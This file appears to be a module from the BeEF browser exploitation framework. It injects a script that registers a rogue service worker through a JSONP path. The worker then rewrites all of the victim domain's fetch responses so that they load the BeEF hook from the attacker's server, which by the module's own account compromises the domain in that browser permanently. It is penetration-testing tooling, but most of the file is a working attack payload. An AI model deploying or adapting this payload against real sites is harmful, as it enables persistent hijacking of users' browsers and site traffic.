//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var scriptElem = document.createElement("script");
  var hook = encodeURIComponent(beef.net.hook);
  var tempBody = encodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@tempBody) %>');
  scriptElem.innerHTML = 'navigator.serviceWorker.register("<%=@JSONPPath%>onfetch%3Dfunction(e)%7B%0Aif(!(e.request.url.indexOf(%27'+beef.net.httpproto+'%3A%2F%2F'+beef.net.host+'%3A'+beef.net.port+'%27)>=0))%0Ae.respondWith(new%20Response(%27'+tempBody+'%3Cscript%20src%3D%5C%27'+beef.net.httpproto+'%3A%2F%2F'+beef.net.host+'%3A'+beef.net.port+hook+'%5C%27%20type%3D%5C%27text%2Fjavascript%5C%27%3E%3C%2Fscript%3E%27%2C%7Bheaders%3A%20%7B%27Content-Type%27%3A%27text%2Fhtml%27%7D%7D))%0Aelse%0Ae.fetch(e.request)%0A%7D%2F%2F")';
  $j("body").append(scriptElem);
  beef.net.send("<%= @command_url %>", <%=@command_id%>, "result=Script element inserted within the body, domain for the browser permanently compromized if everything went as expected.");
});
